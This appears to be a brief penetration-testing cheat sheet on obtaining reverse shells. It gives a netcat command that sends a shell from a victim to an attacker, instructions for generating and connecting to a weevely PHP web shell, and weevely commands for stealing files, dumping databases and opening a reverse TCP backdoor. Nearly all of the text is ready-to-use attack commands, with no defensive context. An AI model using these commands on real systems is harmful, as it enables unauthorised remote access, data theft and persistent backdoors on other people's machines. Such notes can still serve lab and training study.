# Reverse Shell
If we can execute code in the victim:
```console
... nc -e /bin/sh <ip$ <port$
```

While in the attacker:
```console
$ nc -lvnp <port$
```

## weevely
To generate a shell:
```console
$ weevely generate [password] /home/kali/shell.php
$ weevely http://ip/shell.php [password]
```

We can use **:help** inside the weevely shell to get some functions. We can use **-h** in the weevely function to access more options.
Sometimes we wouldn't be able to execute commands, weevely can help us:
```console
$ :shell_sh -v [option] [command]
```

Some other options are:
- **:file_download [remotepath] [localpath]**: download files
- **:file_upload [localpath] [remotepath]**: upload files
- **:file_read [localpath]**: read a file
- **:sql_console**
- **:sql_dump -host [ip] -lpath [localpath].txt [user] [password]**: dump a db into a file (if the db doesn't have a password we should use **''** instead).
- **:backdoor_reversetcp [lhost] [lport]**: create a reverse shell (we need to add a **;** after each command).
##### If any option doesn't work we can use **-vector [option]** to change the attack.

# After a reverse shell...
We can get a interactive shell with the following command:
```console
$ script /dev/null -c bash
```
